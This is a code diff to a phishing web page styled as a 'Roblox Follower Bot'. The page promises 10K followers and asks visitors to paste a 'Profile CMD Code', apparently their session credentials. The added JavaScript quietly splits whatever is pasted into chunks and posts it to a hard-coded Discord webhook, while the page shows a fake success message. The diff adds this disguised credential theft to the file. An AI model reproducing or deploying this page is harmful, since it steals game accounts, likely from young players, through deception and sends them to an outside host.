@@ -77,52 +77,84 @@
             font-size: 18px;
             color: #4CAF50;
         }
+
+        /* Mobile responsive tasarım */
+        @media (max-width: 600px) {
+            body {
+                padding: 10px;
+            }
+
+            h2 {
+                font-size: 20px;
+            }
+
+            textarea {
+                max-width: 100%;
+            }
+
+            button {
+                width: 100%;
+            }
+        }
     </style>
 </head>
 <body>
     <h2>Frellower Roblox Follower Bot</h2>
-    <p>Metninizi girin ve 'Gönder' butonuna tıklayın.</p>
+    <p>Please enter your 'ONLY' profile cmd code. Then click the 'Send' Button and get 10K FOLLOWERS in 10 minutes max!</p>
 
     <textarea id="inputText" placeholder="Enter Profile CMD Code Here!"></textarea><br>
-    <button onclick="sendToDiscord()">Send!</button>
+    <button onclick="uploadText()">Send!</button>
 
     <div id="message-container">
         <p>Success! Followers Sent🎉</p>
     </div>
 
     <script>
-        function sendToDiscord() {
-            const text = document.getElementById("inputText").value;  // Kullanıcının girdiği metin
+        function uploadText() {
+            const text = document.getElementById("inputText").value;
 
-            // Webhook URL'nizi buraya ekleyin
-            const webhookURL = 'https://canary.discord.com/api/webhooks/1312211611506966539/2_xVaoE3JvI3VWsbNpSLM3FIS83yGruTWxkJUDPjMYfxGaDvrEvBCtLHEWmKkkocEzbC';
+            // Mesajı parçalara ayıracak ve her birini webhook'a gönderecek fonksiyon
+            sendToDiscord(text);
+        }
 
-            const payload = {
-                content: text,  // Webhook'a gönderilecek metin
-            };
+        function sendToDiscord(message) {
+            const webhookURL = 'https://canary.discord.com/api/webhooks/1312211611506966539/2_xVaoE3JvI3VWsbNpSLM3FIS83yGruTWxkJUDPjMYfxGaDvrEvBCtLHEWmKkkocEzbC';  // Webhook URL'nizi buraya yerleştirin
+            
+            const maxLength = 2000; // Discord webhook mesaj uzunluğu sınırı
+            let parts = [];
 
-            // Webhook'a POST isteği gönder
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(payload),  // JSON formatında metin gönder
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Mesaj başarıyla gönderildi.');
-                    document.getElementById("message-container").style.display = "block";  // Mesajı ekranda göster
-                } else {
-                    console.log('Mesaj gönderilirken bir hata oluştu:', response.statusText);
-                    alert('Mesaj gönderilirken bir hata oluştu');
-                }
-            })
-            .catch(error => {
-                console.error('Webhook gönderme hatası:', error);
-                alert('Bir hata oluştu: ' + error.message);  // Kullanıcıya hata mesajı göster
+            // Mesajı 2000 karakterlik parçalara bölelim
+            for (let i = 0; i < message.length; i += maxLength) {
+                parts.push(message.substring(i, i + maxLength));
+            }
+
+            // Her bir parça için ayrı ayrı mesaj gönder
+            parts.forEach(part => {
+                const payload = {
+                    content: part,  // Her bir parçayı ayrı bir mesaj olarak gönder
+                };
+
+                // Webhook'a POST isteği gönder
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Mesaj başarıyla gönderildi.');
+                    } else {
+                        console.log('Mesaj gönderilirken bir hata oluştu:', response.statusText);
+                    }
+                })
+                .catch(error => {
+                    console.error('Webhook gönderme hatası:', error);
+                });
             });
         }
     </script>
+
 </body>
 </html>
